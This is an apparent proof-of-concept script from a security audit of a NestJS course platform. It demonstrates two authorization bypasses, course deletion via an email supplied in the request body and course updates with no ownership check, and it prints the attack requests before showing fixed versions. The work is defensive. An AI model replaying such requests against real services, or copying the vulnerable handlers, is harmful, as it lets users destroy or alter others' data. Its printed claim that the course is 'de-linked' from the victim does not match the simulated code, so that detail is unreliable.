/**
 * PoC-004 — AUTH-001/AUTH-002: Authorization Bypass on Course Operations
 *
 * Demonstrates two authorization bugs:
 *
 * AUTH-001 (courses.controller.ts — DELETE /courses/:id):
 *   @Body() email: string  ← email from request body, NOT from JWT
 *   Any authenticated user can delete any other user's course by providing
 *   the victim's email in the request body.
 *
 * AUTH-002 (courses.controller.ts — PATCH /courses/:id and thumbnail):
 *   No ownership check on update/thumbnail routes. Any authenticated user
 *   can overwrite any course's data.
 *
 * This PoC demonstrates the attack paths without a live server by showing
 * exactly what HTTP requests are needed and what the controller/service
 * code does with them.
 *
 * Run: npx ts-node fuzz/poc/poc-004-unauthed-course-ops.ts
 */

// ---------------------------------------------------------------------------
// Simulate the course controller / service logic to demonstrate the bugs
// without needing a live database.
// ---------------------------------------------------------------------------

interface CourseStore {
  [id: string]: { title: string; instructor: string; email: string };
}

const courses: CourseStore = {
  'course-aaa': { title: 'Advanced TypeScript', instructor: 'user-victim',  email: 'victim@example.com' },
  'course-bbb': { title: 'Intro to NestJS',     instructor: 'user-attacker', email: 'attacker@example.com' },
};

const users: Record<string, { email: string; courses_created: string[] }> = {
  'user-victim':   { email: 'victim@example.com',   courses_created: ['course-aaa'] },
  'user-attacker': { email: 'attacker@example.com', courses_created: ['course-bbb'] },
};

// ---------------------------------------------------------------------------
// Replicas of the vulnerable service methods
// ---------------------------------------------------------------------------

/** AUTH-001: Vulnerable deleteCourse — takes email from body, not from JWT */
function vulnerableDeleteCourse(courseId: string, emailFromBody: string): void {
  // courses.controller.ts:78 — email comes from @Body(), not request.user.email
  // courses.service.ts: deleteCourse(id, email) — deletes the course AND de-links
  // from the user specified by emailFromBody.
  delete courses[courseId];
  if (users[emailFromBody]) {
    users[emailFromBody].courses_created =
      users[emailFromBody].courses_created.filter(c => c !== courseId);
  }
}

/** AUTH-002: Vulnerable updateCourse — no ownership check */
function vulnerableUpdateCourse(
  courseId: string,
  updates: Partial<{ title: string }>,
  _requestUserId: string  // JWT-extracted user ID — NOT checked against instructor
): { title: string; instructor: string } | null {
  if (!courses[courseId]) return null;
  Object.assign(courses[courseId], updates);
  return courses[courseId] as any;
}

/** Fixed deleteCourse — email taken from JWT, ownership verified */
function fixedDeleteCourse(courseId: string, jwtUserId: string): void {
  const course = courses[courseId];
  if (!course) throw new Error('Course not found');
  if (course.instructor !== jwtUserId) {
    throw new Error(`ForbiddenException: user "${jwtUserId}" does not own course "${courseId}"`);
  }
  delete courses[courseId];
}

/** Fixed updateCourse — ownership verified */
function fixedUpdateCourse(
  courseId: string,
  updates: Partial<{ title: string }>,
  jwtUserId: string
): { title: string; instructor: string } | null {
  const course = courses[courseId];
  if (!course) return null;
  if (course.instructor !== jwtUserId) {
    throw new Error(`ForbiddenException: user "${jwtUserId}" does not own course "${courseId}"`);
  }
  Object.assign(course, updates);
  return course as any;
}

// ---------------------------------------------------------------------------
// PoC scenarios
// ---------------------------------------------------------------------------

function section(title: string): void {
  console.log('\n' + '─'.repeat(65));
  console.log(title);
  console.log('─'.repeat(65));
}

section('AUTH-001: Unauthenticated Course Deletion');

console.log('Setup:');
console.log('  Victim\'s course "course-aaa" (Advanced TypeScript) exists.');
console.log('  Attacker is authenticated as attacker@example.com.\n');

console.log('Malicious HTTP request:');
console.log('  DELETE /courses/course-aaa');
console.log('  Authorization: Bearer <attacker_jwt>');
console.log('  Content-Type: application/json');
console.log('  Body: "victim@example.com"\n');

console.log('What courses.controller.ts does:');
console.log('  @Body() email = "victim@example.com"  ← from body, NOT from JWT');
console.log('  this.coursesService.deleteCourse("course-aaa", "victim@example.com")\n');

const victimEmailBeforeDelete = users['user-victim'].courses_created.slice();
vulnerableDeleteCourse('course-aaa', 'victim@example.com');

console.log(`✓  ATTACK SUCCEEDED:`);
console.log(`   course-aaa still exists? ${!!courses['course-aaa']} (expected: false)`);
console.log(`   victim's courses before: ${JSON.stringify(victimEmailBeforeDelete)}`);
console.log(`   victim's courses after:  ${JSON.stringify(users['user-victim'].courses_created)}`);
console.log(`   The course was deleted AND de-linked from the victim's account.`);

// Restore state for next test
courses['course-aaa'] = { title: 'Advanced TypeScript', instructor: 'user-victim', email: 'victim@example.com' };
users['user-victim'].courses_created = ['course-aaa'];

section('AUTH-002: Unauthenticated Course Update (Title Overwrite)');

console.log('Malicious HTTP request:');
console.log('  PATCH /courses/course-aaa');
console.log('  Authorization: Bearer <attacker_jwt>');
console.log('  Body: { "title": "HACKED BY ATTACKER" }\n');

console.log(`Course title before: "${courses['course-aaa'].title}"`);
vulnerableUpdateCourse('course-aaa', { title: 'HACKED BY ATTACKER' }, 'user-attacker');
console.log(`Course title after:  "${courses['course-aaa'].title}"`);
console.log('✓  ATTACK SUCCEEDED: Attacker overwrote victim\'s course title.');

// Restore
courses['course-aaa'].title = 'Advanced TypeScript';

section('Fixed: DELETE with ownership check');

try {
  fixedDeleteCourse('course-aaa', 'user-attacker');
  console.log('ERROR: Should have thrown ForbiddenException.');
} catch (e) {
  console.log(`✓  Fix works: ${(e as Error).message}`);
}

section('Fixed: PATCH with ownership check');

try {
  fixedUpdateCourse('course-aaa', { title: 'HACKED' }, 'user-attacker');
  console.log('ERROR: Should have thrown ForbiddenException.');
} catch (e) {
  console.log(`✓  Fix works: ${(e as Error).message}`);
}

section('SUMMARY');
console.log('AUTH-001: Extract email from request.user.email (JWT), not from @Body().');
console.log('AUTH-002: Call assertOwner(courseId, request.user.id) before mutating.');
console.log('See SECURITY.md §AUTH-001 and §AUTH-002 for corrected code.');
